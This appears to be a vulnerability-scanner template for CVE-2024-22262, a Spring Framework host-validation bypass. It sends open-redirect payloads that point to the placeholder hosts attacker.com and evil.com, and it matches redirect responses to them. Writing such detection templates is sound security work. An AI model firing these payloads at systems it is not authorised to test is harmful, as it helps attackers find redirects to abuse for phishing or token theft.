id: CVE-2024-22262

info:
  name: Spring Framework Host Validation Bypass
  author: Abdur Rahman Jamil Chowdhury
  severity: high
  description: |
    Spring Framework contains a URL parsing flaw that improperly handles host validation.
    Attackers can exploit this issue to bypass security controls that rely on strict host validation.
  tags: spring,framework,host-validation,bypass
  references:
    - https://spring.io/security/cve-2024-22262
    - https://nvd.nist.gov/vuln/detail/CVE-2024-22262

requests:
  - method: GET
    path:
      - "{{BaseURL}}/redirect?url=https://attacker.com"
      - "{{BaseURL}}/oauth/callback?redirect=https://evil.com"
    matchers:
      - type: regex
        regex:
          - "(?i)Location:\\s*(https?://attacker.com|https?://evil.com)"
        part: header
      - type: status
        status:
          - 302
          - 301
    follow_redirects: false
